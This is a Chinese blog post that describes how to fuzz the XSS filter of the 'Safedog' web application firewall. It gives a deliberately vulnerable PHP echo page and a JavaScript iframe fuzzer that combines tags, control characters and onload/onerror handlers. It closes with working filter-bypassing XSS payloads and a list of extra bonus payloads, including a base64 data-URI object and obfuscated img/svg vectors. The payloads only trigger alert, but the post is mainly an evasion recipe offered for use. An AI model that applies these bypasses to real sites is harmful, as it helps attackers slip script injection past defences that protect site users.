---
title: 一次bypass安全狗xss的fuzz思路及实现
date: 2019-10-11 17:18:00
layout: post
tags:
- bypass
- xss

---

> 在看到key发出的fuzz出的严重的真的是柠檬了，突然想到了key的小密圈的xss bypass safedog，于是就想出来试试fuzz来bypass安全狗的xss防护规则，于是有了这个比较菜的文章

#### 思路

&emsp;&emsp;XSS本质上是JS，但JS代码往往要在`<script>`标签内或者在 "On" 事件和 "javascript" 伪协议内才可以执行，往往挖掘XSS的时候我们会插入一个标签来测试是否过滤了`<`、`>`，来进行下一步操作。然后用js去动态添加iframe，src为fuzz xss的地址，通过alert的数字来定位payload

所以我们首先是需要了解HTML标签的结构，可以查看前面的 [浏览器渲染原理](http://console-log.cn/2017/06/20/browser_running_view/) 
标签由`<`、`标签名`、`控制字符`、`属性名`、`数据值`、`事件名`、`事件值`、`>`构成（我觉得，如果存在错误的话谅解一下）On 事件实际是事件名
##### 开始表演
>标签表达式: <标签名 控制字符 属性名="数据值" 控制字符 事件名="事件值">

将这些标签名 控制字符 属性名 数据值 事件名 事件值放在数组上以便使用

#### FUZZING
我在本地搭建了好了环境
php文件: `index.php`:
```
<?php
echo $_GET[fuzz];
?>
```
dog:
![dog](./img/5.jpg)

通过burp来测试一下安全狗过滤了哪些标签
![labs](./img/1.jpg)

发现有这些标签是没有被过滤的
>a
b
q
br
dd
dl
dt
h1
h2
h3
h4
h5
h6
hr
bdi
bdo
big
del
dfn
dir
div
kbd
map
var
wbr
abbr
area
base
body
head
html
main
mark
menu
meta
aside
audio
meter
video
applet
button
dialog
header
keygen
acronym
address
article
details
basefont
datalist
menuitem
blockquote

##### 控制字符：
>%09
%00
%0d
%0a

太多就放这几个就可以了

属性名：
>onload
onerror

同上

然后我们使用js来动态添加iframe来加载我们的payload
code：
```
var i,j,k,xss,f=0;
var ons = ["onload","onerror"];
var labs = ["a","b","q","br","dd","dl","dt","h1","del","abbr","video","base","audio","details"];
var hexs= ["%09","%00","%0d","%0a"];
for(i=0;i<labs.length;i++){
    for(j=0;j<hexs.length;j++){
        for(k=0;k<ons.length;k++){
            xss = f+'<'+labs[i]+hexs[j]+ons[k]+"=alert("+f+") src=a>a";
            var body = document.getElementsByTagName("body");
            var div = document.createElement("div");
            div.innerHTML = f+"<iframe src=\"http://127.0.0.1/index.php?fuzz="+xss+"\"></iframe>";
            document.body.appendChild(div);
            f = f+1;
        }
    }
}

```

我这边选取了几个标签和事件还有控制字符，因为太多的话请求过大，事件太久了，证明一下思路即可

因为很多`onload`、`onerror`都是和`src`属性名配合使用的，所以我在xss payload标签山添加了src

然后放在浏览器测试：
![xss](./img/2.jpg)
很快我们就收获了几个可以绕过安全狗的xss payload
然后更具alert出来的值快速定位payload地址 得到了两个标签下的payload
```
<video%09onerror=alert(81) src=a>
<video%0donerror=alert(85) src=a>
<audio%09onerror=alert(97) src=a>
<audio%0donerror=alert(101) src=a>
<audio%0aonerror=alert(103) src=a>
```
还有没复制全，证明了一下这个思路是可行的，而且我们也收获了一些bypass safedog的xss payload

附赠几个payload：
```
<dd%09onclick=alert(1)>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
<img/11111111111111111111111111111/src=x/onerror=alert(1)>
<input onclick=alert(1) value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>
```





